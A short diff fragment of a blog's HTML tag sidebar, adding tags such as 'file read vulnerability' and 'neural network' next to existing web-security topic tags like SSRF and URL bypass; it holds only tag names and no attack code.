         <span class="sidebar-tag-name" data-tags="无参数构造payload"><span class="iconfont-archer">&#xe606;</span>无参数构造payload</span>
+    
+        <span class="sidebar-tag-name" data-tags="文件读取漏洞"><span class="iconfont-archer">&#xe606;</span>文件读取漏洞</span>
     
         <span class="sidebar-tag-name" data-tags="SSRF"><span class="iconfont-archer">&#xe606;</span>SSRF</span>
     
         <span class="sidebar-tag-name" data-tags="misc_zip"><span class="iconfont-archer">&#xe606;</span>misc_zip</span>
+    
+        <span class="sidebar-tag-name" data-tags="神经网络"><span class="iconfont-archer">&#xe606;</span>神经网络</span>
     
         <span class="sidebar-tag-name" data-tags="url取反绕过"><span class="iconfont-archer">&#xe606;</span>url取反绕过</span>
     
